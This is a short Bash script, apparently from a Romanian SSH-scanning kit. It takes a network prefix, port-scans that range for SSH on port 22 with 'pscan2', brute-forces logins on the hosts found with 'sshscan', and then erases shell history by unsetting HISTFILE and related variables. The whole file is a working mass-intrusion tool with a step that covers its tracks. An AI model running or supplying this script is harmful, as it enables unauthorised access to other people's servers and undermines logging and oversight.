if [ $# != 1 ]; then
        echo "Foloseste: $0 <X.Y>"
        exit;
fi
rm -rf ips.lst
BLK='[1;30m'
RED='[1;31m'
GRN='[1;32m'
YEL='[1;33m'
DBLU='[1;34m'
MAG='[1;35m'
CYN='[1;36m'
WHI='[1;37m'
DRED='[0;31m'
DGRN='[0;32m'
DYEL='[0;33m'
DBLU='[0;34m'
DMAG='[0;35m'
DCYN='[0;36m'
DWHI='[0;37m'
RES='[0m'

sleep 1
././pscan2 $1 22
sleep 1
echo "Brute Force"
sleep 2
./sshscan -H ips.lst -U user -t 22 -T 700
history -n
export HISTFILE=/dev/null
export HISTFILE=/dev/null
unset WATCH
unset HISTLOG
unset HISTSAVE
unset HISTFILE
sleep 3

